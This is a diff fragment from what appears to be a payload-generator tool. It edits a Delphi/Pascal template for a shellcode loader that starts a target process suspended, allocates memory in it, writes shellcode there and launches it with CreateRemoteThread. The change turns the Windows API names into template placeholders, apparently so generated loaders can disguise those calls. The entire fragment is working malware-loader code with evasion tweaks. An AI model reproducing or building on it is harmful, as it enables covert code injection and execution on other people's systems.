@@ -35,16 +35,16 @@ begin
     si.cb := SizeOf(si);
     ZeroMemory(@pi, SizeOf(pi));
 
-    CreateProcessA(nil, PAnsiChar('$target'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
+    {CreateProcessA}(nil, PAnsiChar('$target'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
 
     
     {transformers}
-    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission);
+    addr := {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission);
 
-    WriteProcessMemory(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);
+    {WriteProcessMemory}(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);
 
-    hThread := CreateRemoteThread(pi.hProcess, nil, 0, addr, nil, 0, nil);
+    hThread := {CreateRemoteThread}(pi.hProcess, nil, 0, addr, nil, 0, nil);
 
-    WaitForSingleObject(hThread, 500);
+    {WaitForSingleObject}(hThread, 500);
 end;
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
